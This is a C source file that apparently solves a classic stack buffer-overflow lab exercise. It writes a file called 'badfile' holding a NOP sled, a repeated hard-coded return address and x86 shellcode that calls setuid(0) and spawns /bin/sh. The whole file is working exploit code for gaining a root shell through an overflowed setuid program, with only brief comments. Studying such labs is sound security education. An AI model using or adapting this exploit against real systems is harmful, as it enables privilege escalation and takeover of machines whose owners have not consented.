/* exploit.c */
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

char shellcode[]=
"\x31\xc0" /* Line 1: xorl %eax,%eax */
"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
"\xb0\xd5" /* Line 3: movb $0xd5,%al */
"\xcd\x80" /* Line 4: int $0x80 */
"\x31\xc0" /* xorl %eax,%eax */
"\x50" /* pushl %eax */
"\x68""//sh" /* pushl $0x68732f2f */
"\x68""/bin" /* pushl $0x6e69622f */
"\x89\xe3" /* movl %esp,%ebx */
"\x50" /* pushl %eax */
"\x53" /* pushl %ebx */
"\x89\xe1" /* movl %esp,%ecx */
"\x99" /* cdql */
"\xb0\x0b" /* movb $0x0b,%al */
"\xcd\x80" /* int $0x80 */
;

unsigned long get_sp(void) {
	__asm__("movl %esp,%eax");
}

void main(int argc, char **argv){
	int offset = 0;
	if (argc > 1) offset  = atoi(argv[1]);
	long buff_addr = (0xeac4bfff);//3791962111;//this should be the address of str in bof() + 100 and then switched around
	printf("Using address: %p\n", (void*)buff_addr);
	//printf("%ld\n", buff_addr);
	char buffer[517];  
	char* ptr;
	FILE *badfile;
	long* addr_ptr, addr;
	int buff_size = sizeof(buffer);
	printf("%d\n", sizeof(shellcode));
	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, buff_size);
	//addr = get_sp();// - offset;
	ptr = buffer;
	addr_ptr = (long *) ptr;
	for(int i = 0; i < 84; i+=4){
		ptr = buffer+i;
		addr_ptr = (long *) ptr;
		*(addr_ptr) = buff_addr;
	}

	//setting the pointer to about half way into the buffer and copying the shellcode there
	//ptr = buffer + ((517/2)-(strlen(shellcode))); //233 in the buffer
	ptr = buffer+(sizeof(buffer)-sizeof(shellcode));
	for(int i = 0; i < sizeof(shellcode); i++)
		*(ptr++) = shellcode[i];

	buffer[buff_size-1] = '\0';


	badfile = fopen("./badfile", "w");
	fwrite(buffer, buff_size, 1, badfile);
	fclose(badfile);
}
